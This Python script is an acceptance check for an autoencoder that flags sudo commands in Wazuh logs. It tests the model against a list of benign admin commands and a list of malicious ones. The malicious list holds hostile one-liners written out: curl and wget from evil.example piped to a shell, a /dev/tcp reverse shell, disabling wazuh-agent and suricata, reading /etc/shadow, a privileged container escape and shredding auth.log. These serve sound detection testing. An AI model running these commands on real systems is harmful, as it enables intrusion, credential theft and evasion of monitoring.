"""Acceptance check: does the trained model separate intrusion from verbosity?

The threshold calibration in ``training/evaluate.py`` only guarantees a false
positive rate on benign traffic. It says nothing about whether the model reacts
to an actual intrusion, and schema v1 passed calibration while scoring
``curl … | bash`` five times *below* the alarm threshold — a long, harmless
``docker exec`` outscored every attack in the corpus.

This script closes that gap. It scores two fixed corpora against the model and
threshold currently in the config, and fails when either expectation breaks:

* every malicious shape must score above tau (a miss is a blind spot);
* every benign shape must score below it (a hit is a false positive).

The corpora are deliberately small and readable rather than exhaustive. Benign
entries are real commands taken from this deployment's archives, including the
long ``docker exec`` one-liners that dominated the alert stream; malicious ones
are canonical shapes an autoencoder over command text can reasonably be asked to
catch. Run it after every retrain, before promoting a model.

Usage:
    python scripts/validate_detection.py [config.json]
"""

from __future__ import annotations

import os
import sys
from typing import List, Tuple

import numpy as np
import torch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.config import load_config  # noqa: E402
from src.features import LogVectorizer, standardize  # noqa: E402
from src.model import LogAutoencoder  # noqa: E402

# Routine administration observed in /var/ossec/logs/archives. None of these
# should raise an alert, however long or unfamiliar the command looks.
BENIGN_COMMANDS: Tuple[str, ...] = (
    "/usr/bin/docker ps",
    "/usr/bin/docker ps -a --format ' {{.Names}} | {{.Image}} | {{.Status}}'",
    "/usr/bin/docker exec jenkins sh -c 'ls -d /var/jenkins_home/plugins/*/ 2>/dev/null | wc -l'",
    "/usr/bin/docker inspect jenkins --format 'mem_limit={{.HostConfig.Memory}}'",
    "/usr/bin/docker exec -u jenkins jenkins sh -c 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
    "ssh-keyscan -t ed25519 github.com >> ~/.ssh/known_hosts'",
    "/usr/bin/find /opt /home -maxdepth 3 ( -name docker-compose*.yml -o -name compose*.yml )",
    "/usr/bin/journalctl -b --no-pager -u docker.service --since '2026-07-23 21:13:00'",
    "/usr/bin/docker exec pihole sh -c 'sqlite3 -header /etc/pihole/pihole-FTL.db "
    "\"SELECT id,timestamp,domain,client FROM queries ORDER BY timestamp DESC LIMIT 3;\"'",
    "/usr/bin/docker run --rm -v app_pgdata:/d:ro alpine sh -c 'du -sh /d; ls /d | head -8'",
    "/usr/bin/install -d -m 700 -o deploy -g deploy /home/deploy/.ssh",
)

# Shapes the detector exists to catch. Short and unremarkable in length, which
# is exactly why a length-driven model missed them.
MALICIOUS_COMMANDS: Tuple[str, ...] = (
    "/usr/bin/curl -s http://evil.example/x.sh | bash",
    "/usr/bin/wget -qO- http://evil.example/i.sh | sh",
    "/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
    "/bin/sh -c 'echo ZXZpbA== | base64 -d | sh'",
    "/usr/bin/systemctl stop wazuh-agent",
    "/usr/bin/systemctl mask suricata",
    "/bin/cat /etc/shadow",
    "/usr/sbin/usermod -aG sudo attacker",
    "/usr/bin/docker run --rm --privileged -v /:/host alpine chroot /host sh",
    "/usr/bin/shred -u /var/log/auth.log",
)


def _score(
    model: LogAutoencoder,
    vectorizer: LogVectorizer,
    command: str,
    scaler_mean: List[float],
    scaler_var: List[float],
) -> float:
    """Return the reconstruction MSE for ``command`` as a sudo-shaped event."""
    event = {
        "timestamp": "2026-08-01T11:00:00.000+0000",
        "agent": {"id": "000", "name": "host-01"},
        "data": {
            "command": command,
            "srcuser": "admin",
            "dstuser": "root",
            "pwd": "/home/admin",
        },
    }
    normalized = standardize(vectorizer.extract_vector(event), scaler_mean, scaler_var)
    with torch.no_grad():
        tensor = torch.from_numpy(normalized).unsqueeze(0)
        error = ((tensor - model(tensor)) ** 2).mean()
    return float(error)


def validate(config_path: str) -> int:
    """Score both corpora and return the number of failed expectations."""
    config = load_config(config_path)
    tau = float(config["anomaly_threshold_tau"])

    model = LogAutoencoder(
        input_dim=int(config["input_dim"]), latent_dim=int(config["latent_dim"])
    )
    model.load_state_dict(torch.load(config["model_save_path"], map_location="cpu"))
    model.eval()
    vectorizer = LogVectorizer()

    print(f"schema v{config.get('feature_schema_version', '?')}  tau={tau:.6f}\n")
    failures = 0
    for label, corpus, should_alert in (
        ("MALICIOUS", MALICIOUS_COMMANDS, True),
        ("BENIGN", BENIGN_COMMANDS, False),
    ):
        print(f"--- {label} (expected {'above' if should_alert else 'below'} tau) ---")
        for command in corpus:
            score = _score(
                model, vectorizer, command, config["scaler_mean"], config["scaler_var"]
            )
            alerts = score > tau
            ok = alerts is should_alert
            failures += 0 if ok else 1
            ratio = score / tau if tau > 0 else float("nan")
            print(
                f"  {'ok  ' if ok else 'FAIL'} {score:10.6f}  x{ratio:7.2f} tau  "
                f"{command[:72]}"
            )
        print()

    total = len(MALICIOUS_COMMANDS) + len(BENIGN_COMMANDS)
    print(f"{total - failures}/{total} expectations met")
    return failures


if __name__ == "__main__":
    config_arg = sys.argv[1] if len(sys.argv) > 1 else "config/global_config.json"
    raise SystemExit(1 if validate(config_arg) else 0)
